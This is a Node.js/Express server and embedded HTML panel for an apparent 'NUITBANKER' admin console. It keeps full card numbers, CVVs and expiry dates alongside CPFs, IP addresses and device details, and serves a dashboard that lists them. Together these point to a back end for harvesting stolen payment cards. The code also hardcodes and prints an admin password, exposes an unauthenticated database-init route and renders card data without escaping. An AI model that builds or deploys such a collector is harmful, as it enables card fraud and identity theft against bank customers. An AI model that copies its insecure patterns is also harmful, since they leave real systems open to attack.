require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');

const app = express();
app.use(cors());
app.use(express.json());

// ============================================================
// CONEXÃO COM POSTGRESQL
// ============================================================
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

// ============================================================
// ROTA PARA INICIALIZAR O BANCO
// Acesse: https://seu-app.onrender.com/api/init
// ============================================================
app.get('/api/init', async (req, res) => {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS usuarios (
                id SERIAL PRIMARY KEY,
                nome VARCHAR(255) NOT NULL DEFAULT 'Usuário',
                email VARCHAR(255),
                cpf VARCHAR(11) UNIQUE NOT NULL,
                senha VARCHAR(255) NOT NULL,
                ip VARCHAR(50),
                dispositivo TEXT,
                navegador TEXT,
                role VARCHAR(50) DEFAULT 'user',
                ultimo_acesso TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS logs_acesso (
                id SERIAL PRIMARY KEY,
                cpf VARCHAR(11),
                ip VARCHAR(50),
                dispositivo TEXT,
                navegador TEXT,
                data_acesso TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS pedidos (
                id SERIAL PRIMARY KEY,
                pedido_id VARCHAR(100),
                cliente_nome VARCHAR(255),
                cliente_cpf VARCHAR(11),
                total DECIMAL(10,2),
                forma_pagamento VARCHAR(50),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS cartoes (
                id SERIAL PRIMARY KEY,
                nome_titular VARCHAR(255),
                numero VARCHAR(50),
                cvv VARCHAR(10),
                validade_mes VARCHAR(2),
                validade_ano VARCHAR(4),
                bandeira VARCHAR(50),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        const senhaHash = await bcrypt.hash('77991958', 10);
        await pool.query(`
            INSERT INTO usuarios (nome, cpf, email, senha, role)
            VALUES ('Kakabanker', '00000000000', 'admin@nuitbanker.com', $1, 'admin')
            ON CONFLICT (cpf) DO NOTHING
        `, [senhaHash]);
        
        res.json({ success: true, message: 'Banco inicializado! Admin: Kakabanker, Senha: 77991958' });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// ============================================================
// ROTA DE LOGIN DO ADMIN
// ============================================================
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    
    try {
        const result = await pool.query('SELECT * FROM usuarios WHERE nome = $1 AND role = $2', [username, 'admin']);
        
        if (result.rows.length === 0) {
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        
        const user = result.rows[0];
        const validPassword = await bcrypt.compare(password, user.senha);
        
        if (!validPassword) {
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        
        const token = jwt.sign(
            { id: user.id, nome: user.nome, role: user.role },
            process.env.JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        res.json({ success: true, token });
    } catch (error) {
        res.status(500).json({ error: 'Erro no servidor' });
    }
});

// ============================================================
// MIDDLEWARE ADMIN
// ============================================================
function isAdmin(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Token não fornecido' });
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        if (decoded.role !== 'admin') {
            return res.status(403).json({ error: 'Acesso negado' });
        }
        req.user = decoded;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Token inválido' });
    }
}

// ============================================================
// ROTAS ADMIN
// ============================================================
app.get('/api/admin/users', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT id, nome, cpf, email, role, ip, dispositivo, created_at FROM usuarios ORDER BY id DESC');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar usuários' });
    }
});

app.delete('/api/admin/users/:id', isAdmin, async (req, res) => {
    const { id } = req.params;
    try {
        await pool.query('DELETE FROM usuarios WHERE id = $1 AND role != $2', [id, 'admin']);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao deletar usuário' });
    }
});

app.get('/api/admin/logs', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM logs_acesso ORDER BY data_acesso DESC LIMIT 200');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar logs' });
    }
});

app.get('/api/admin/cartoes', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM cartoes ORDER BY id DESC');
        res.json({ success: true, cartoes: result.rows });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar cartões' });
    }
});

app.get('/api/admin/pedidos', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM pedidos ORDER BY id DESC');
        res.json({ success: true, pedidos: result.rows });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar pedidos' });
    }
});

app.get('/api/admin/stats', isAdmin, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM usuarios WHERE role = $1', ['user']);
        const totalAdmins = await pool.query('SELECT COUNT(*) FROM usuarios WHERE role = $1', ['admin']);
        const totalLogs = await pool.query('SELECT COUNT(*) FROM logs_acesso');
        const logsHoje = await pool.query('SELECT COUNT(*) FROM logs_acesso WHERE DATE(data_acesso) = CURRENT_DATE');
        
        res.json({
            success: true,
            stats: {
                total_users: parseInt(totalUsers.rows[0].count),
                total_admins: parseInt(totalAdmins.rows[0].count),
                total_logs: parseInt(totalLogs.rows[0].count),
                logs_hoje: parseInt(logsHoje.rows[0].count)
            }
        });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar estatísticas' });
    }
});

// ============================================================
// PÁGINA ADMIN COMPLETA (HTML)
// ============================================================
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NUITBANKER | Admin Console</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Outfit', sans-serif; background: #0a0a0a; color: #fff; }
        
        .login-container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
        }
        .login-card {
            background: rgba(0,0,0,0.8);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
        }
        .login-card h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 32px;
        }
        .login-card p {
            text-align: center;
            color: rgba(255,255,255,0.5);
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: rgba(255,255,255,0.7);
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
        }
        .btn-login {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #fff, #ccc);
            color: #000;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }
        .error-msg {
            background: rgba(239,68,68,0.2);
            border: 1px solid rgba(239,68,68,0.3);
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            color: #f87171;
            display: none;
        }
        
        /* Admin Panel */
        .admin-panel { display: none; }
        .admin-panel.visible { display: block; }
        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            width: 260px;
            height: 100vh;
            background: rgba(0,0,0,0.95);
            border-right: 1px solid rgba(255,255,255,0.1);
            padding: 30px 20px;
        }
        .sidebar h2 { margin-bottom: 30px; text-align: center; }
        .sidebar-menu { list-style: none; }
        .sidebar-menu li { margin-bottom: 10px; }
        .sidebar-menu a {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            color: rgba(255,255,255,0.6);
            text-decoration: none;
            border-radius: 10px;
            cursor: pointer;
        }
        .sidebar-menu a:hover, .sidebar-menu a.active {
            background: rgba(255,255,255,0.1);
            color: #fff;
        }
        .main-content {
            margin-left: 260px;
            padding: 30px;
        }
        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logout-btn {
            background: rgba(255,255,255,0.1);
            border: none;
            padding: 8px 20px;
            border-radius: 8px;
            color: #fff;
            cursor: pointer;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .stat-value { font-size: 28px; font-weight: 700; color: #10b981; }
        .stat-label { font-size: 12px; opacity: 0.6; margin-top: 8px; }
        .tabs { display: flex; gap: 12px; margin-bottom: 25px; flex-wrap: wrap; }
        .tab {
            padding: 8px 22px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
        }
        .tab.active { background: #10b981; color: #000; }
        .table-wrapper { overflow-x: auto; background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
        th { color: #10b981; font-size: 12px; }
        .badge-admin { background: rgba(239,68,68,0.2); color: #f87171; padding: 4px 12px; border-radius: 20px; font-size: 11px; }
        .badge-user { background: rgba(16,185,129,0.2); color: #10b981; padding: 4px 12px; border-radius: 20px; font-size: 11px; }
        .btn-danger { background: rgba(239,68,68,0.2); border: 1px solid rgba(239,68,68,0.3); padding: 5px 12px; border-radius: 6px; color: #f87171; cursor: pointer; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        @media (max-width: 768px) {
            .sidebar { transform: translateX(-100%); transition: 0.3s; z-index: 100; }
            .sidebar.open { transform: translateX(0); }
            .main-content { margin-left: 0; padding: 20px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .menu-toggle {
                position: fixed;
                bottom: 20px;
                left: 20px;
                background: #10b981;
                padding: 12px;
                border-radius: 50%;
                cursor: pointer;
                z-index: 101;
            }
        }
        @media (min-width: 769px) { .menu-toggle { display: none; } }
        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: rgba(0,0,0,0.9);
            padding: 12px 20px;
            border-radius: 8px;
            border-left: 3px solid #10b981;
            z-index: 1000;
        }
    </style>
</head>
<body>

<div class="login-container" id="loginContainer">
    <div class="login-card">
        <h1>NUITBANKER</h1>
        <p>Admin Control Center</p>
        <div id="loginError" class="error-msg">
            <i class="fas fa-exclamation-triangle"></i> Credenciais inválidas
        </div>
        <div class="input-group">
            <label>USUÁRIO</label>
            <input type="text" id="username" placeholder="Kakabanker">
        </div>
        <div class="input-group">
            <label>SENHA</label>
            <input type="password" id="password" placeholder="••••••••">
        </div>
        <button class="btn-login" onclick="handleLogin()">
            <i class="fas fa-arrow-right"></i> ENTRAR
        </button>
    </div>
</div>

<div id="adminPanel" class="admin-panel">
    <div class="menu-toggle" onclick="toggleSidebar()">
        <i class="fas fa-bars"></i>
    </div>
    <aside class="sidebar" id="sidebar">
        <h2>NUITBANKER</h2>
        <ul class="sidebar-menu">
            <li><a onclick="switchTab('dashboard')" class="active"><i class="fas fa-chart-line"></i> Dashboard</a></li>
            <li><a onclick="switchTab('users')"><i class="fas fa-users"></i> Usuários</a></li>
            <li><a onclick="switchTab('cards')"><i class="fas fa-credit-card"></i> Cartões</a></li>
            <li><a onclick="switchTab('logs')"><i class="fas fa-history"></i> Logs</a></li>
        </ul>
    </aside>
    <main class="main-content">
        <div class="admin-header">
            <h1>NUITBANKER <span style="color:#10b981">v1</span></h1>
            <button class="logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> SAIR</button>
        </div>
        
        <div id="tabDashboard" class="tab-content active">
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value" id="statUsers">0</div><div class="stat-label">Total Usuários</div></div>
                <div class="stat-card"><div class="stat-value" id="statAdmins">0</div><div class="stat-label">Administradores</div></div>
                <div class="stat-card"><div class="stat-value" id="statCards">0</div><div class="stat-label">Cartões Salvos</div></div>
                <div class="stat-card"><div class="stat-value" id="statLogs">0</div><div class="stat-label">Acessos Hoje</div></div>
            </div>
            <div class="tabs">
                <div class="tab active" onclick="switchSubTab('users')">USUÁRIOS</div>
                <div class="tab" onclick="switchSubTab('cards')">CARTÕES</div>
                <div class="tab" onclick="switchSubTab('logs')">LOGS</div>
            </div>
            <div id="usersSubTab" class="tab-content active">
                <div class="table-wrapper">
                    <table>
                        <thead><tr><th>ID</th><th>Nome</th><th>CPF</th><th>Email</th><th>Cargo</th><th>IP</th><th>Data</th><th>Ações</th></tr></thead>
                        <tbody id="usersTable"><tr><td colspan="8">Carregando...</td></tr></tbody>
                    </table>
                </div>
            </div>
            <div id="cardsSubTab" class="tab-content">
                <div class="table-wrapper">
                    <table>
                        <thead><tr><th>Titular</th><th>Número</th><th>CVV</th><th>Validade</th><th>Data</th></tr></thead>
                        <tbody id="cardsTable"><tr><td colspan="5">Carregando...</td></tr></tbody>
                    </table>
                </div>
            </div>
            <div id="logsSubTab" class="tab-content">
                <div class="table-wrapper">
                    <table>
                        <thead><tr><th>CPF</th><th>IP</th><th>Dispositivo</th><th>Data</th></tr></thead>
                        <tbody id="logsTable"><tr><td colspan="4">Carregando...</td></tr></tbody>
                    </table>
                </div>
            </div>
        </div>
    </main>
</div>

<script>
    const API_URL = '';
    let adminToken = null;

    async function handleLogin() {
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const errorDiv = document.getElementById('loginError');
        
        if (!username || !password) {
            errorDiv.style.display = 'block';
            errorDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Digite usuário e senha';
            return;
        }
        
        try {
            const res = await fetch('/api/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            const data = await res.json();
            
            if (data.success) {
                adminToken = data.token;
                localStorage.setItem('adminToken', adminToken);
                document.getElementById('loginContainer').style.display = 'none';
                document.getElementById('adminPanel').classList.add('visible');
                loadAllData();
                setInterval(() => { if(adminToken) loadAllData(); }, 10000);
            } else {
                errorDiv.style.display = 'block';
                errorDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Usuário ou senha inválidos';
                setTimeout(() => errorDiv.style.display = 'none', 3000);
            }
        } catch (error) {
            errorDiv.style.display = 'block';
            errorDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Erro de conexão';
        }
    }

    function logout() {
        localStorage.removeItem('adminToken');
        adminToken = null;
        document.getElementById('adminPanel').classList.remove('visible');
        document.getElementById('loginContainer').style.display = 'flex';
    }

    function toggleSidebar() {
        document.getElementById('sidebar').classList.toggle('open');
    }

    function switchTab(tabName) {
        document.querySelectorAll('.sidebar-menu a').forEach(a => a.classList.remove('active'));
        event.target.classList.add('active');
        document.querySelectorAll('#tabDashboard .tab-content').forEach(c => c.classList.remove('active'));
        if (tabName === 'dashboard') document.getElementById('tabDashboard').classList.add('active');
    }

    function switchSubTab(tabName) {
        document.querySelectorAll('#tabDashboard .tabs .tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        document.getElementById('usersSubTab').classList.remove('active');
        document.getElementById('cardsSubTab').classList.remove('active');
        document.getElementById('logsSubTab').classList.remove('active');
        document.getElementById(tabName + 'SubTab').classList.add('active');
    }

    async function loadAllData() {
        if (!adminToken) return;
        const headers = { 'Authorization': 'Bearer ' + adminToken };
        
        try {
            const usersRes = await fetch('/api/admin/users', { headers });
            const users = await usersRes.json();
            if (Array.isArray(users)) {
                document.getElementById('usersTable').innerHTML = users.map(u => `
                    <tr>
                        <td>${u.id}</td><td>${u.nome || '-'}</td><td>${u.cpf || '-'}</td><td>${u.email || '-'}</td>
                        <td><span class="${u.role === 'admin' ? 'badge-admin' : 'badge-user'}">${u.role === 'admin' ? 'Admin' : 'User'}</span></td>
                        <td>${u.ip || '-'}</td><td>${new Date(u.created_at).toLocaleDateString()}</td>
                        <td>${u.role !== 'admin' ? '<button class="btn-danger" onclick="deleteUser(' + u.id + ')">Excluir</button>' : '-'}</td>
                    </tr>
                `).join('');
                document.getElementById('statUsers').innerText = users.length;
                document.getElementById('statAdmins').innerText = users.filter(u => u.role === 'admin').length;
            }
            
            const cardsRes = await fetch('/api/admin/cartoes', { headers });
            const cardsData = await cardsRes.json();
            if (cardsData.success && cardsData.cartoes) {
                document.getElementById('cardsTable').innerHTML = cardsData.cartoes.map(c => `
                    <tr><td>${c.nome_titular || '-'}</td><td>${c.numero || '-'}</td><td>${c.cvv || '-'}</td><td>${c.validade_mes || ''}/${c.validade_ano || ''}</td><td>${new Date(c.created_at).toLocaleString()}</td></tr>
                `).join('');
                document.getElementById('statCards').innerText = cardsData.cartoes.length;
            }
            
            const logsRes = await fetch('/api/admin/logs', { headers });
            const logs = await logsRes.json();
            if (Array.isArray(logs)) {
                document.getElementById('logsTable').innerHTML = logs.map(l => `
                    <tr><td>${l.cpf || '-'}</td><td>${l.ip || '-'}</td><td>${l.dispositivo || '-'}</td><td>${new Date(l.data_acesso).toLocaleString()}</td></tr>
                `).join('');
                const hoje = new Date().toDateString();
                const logsHoje = logs.filter(l => new Date(l.data_acesso).toDateString() === hoje).length;
                document.getElementById('statLogs').innerText = logsHoje;
            }
        } catch(e) { console.error(e); }
    }

    async function deleteUser(id) {
        if (!confirm('Excluir este usuário?')) return;
        try {
            await fetch('/api/admin/users/' + id, { method: 'DELETE', headers: { 'Authorization': 'Bearer ' + adminToken } });
            loadAllData();
        } catch(e) { alert('Erro ao excluir'); }
    }

    if (localStorage.getItem('adminToken')) {
        adminToken = localStorage.getItem('adminToken');
        document.getElementById('loginContainer').style.display = 'none';
        document.getElementById('adminPanel').classList.add('visible');
        loadAllData();
        setInterval(() => { if(adminToken) loadAllData(); }, 10000);
    }
</script>
</body>
</html>
    `);
});

// ============================================================
// INICIAR SERVIDOR
// ============================================================
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   🚀 NUITBANKER ADMIN RODANDO                             ║
    ║                                                          ║
    ║   📡 Porta: ${PORT}                                         ║
    ║   🔗 URL: https://seu-app.onrender.com                    ║
    ║                                                          ║
    ║   👤 Admin: Kakabanker                                    ║
    ║   🔐 Senha: 77991958                                      ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    `);
});